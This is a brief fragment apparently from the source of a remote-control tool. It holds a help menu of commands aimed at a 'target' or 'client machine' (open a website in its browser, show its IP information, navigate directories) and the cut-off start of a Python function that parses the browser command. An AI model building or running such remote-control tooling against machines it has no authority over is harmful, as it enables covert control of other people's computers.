...
browser       Open an website on client machine browser
info_ip       information ip of target
pwd           Print working directory in client machine
cd -          Switch back to previous directory in client 
machine
...
def browser(cmd):
  url = "".join(cmd.split("browser")).strip()
  if not url.strip(): print("Usage: browser <Websute_URL>\n")
  else:
